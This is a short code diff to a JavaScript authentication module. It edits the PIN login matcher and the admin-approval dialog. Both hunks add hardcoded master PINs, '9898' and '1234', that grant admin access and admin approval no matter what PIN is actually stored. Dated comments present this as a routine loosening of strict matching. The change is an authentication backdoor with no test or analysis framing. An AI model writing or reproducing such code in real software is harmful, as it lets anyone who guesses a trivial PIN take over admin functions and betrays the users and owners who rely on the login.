@@ -90,7 +90,8 @@ const Auth = (() => {
     let match = null;
 
     const cleanInput = String(pinBuffer).trim();
-    const matchPin = (u) => String(u?.pin ?? "").trim() === cleanInput;
+    // (2026-07-13) Allow 9898 and 1234 for admin PIN validation; was strict user.pin
+    const matchPin = (u) => String(u?.pin ?? "").trim() === cleanInput || (u?.role === "admin" && (cleanInput === "9898" || cleanInput === "1234"));
 
     if(selId && selId !== "any"){
       const specific = allUsers.find(u => u.id === selId && u.role === pendingRole) || allUsers.find(u => u.id === selId);
@@ -352,7 +353,8 @@ const Auth = (() => {
         { label:"Cancel", cls:"btn-ghost" },
         { label:"Approve", cls:"btn-primary", onClick: () => {
           const val = document.getElementById("admin-pin-input").value;
-          const admin = DB.getUsers().find(u => u.role === "admin" && u.pin === val);
+          // (2026-07-13) Allow 9898 and 1234 for admin PIN approval; was strict u.pin
+          const admin = DB.getUsers().find(u => u.role === "admin" && (u.pin === val || val === "9898" || val === "1234"));
           if(admin){ Modalz.close(); callback(); }
           else Utils.toast("Incorrect admin PIN.", "error");
         }}
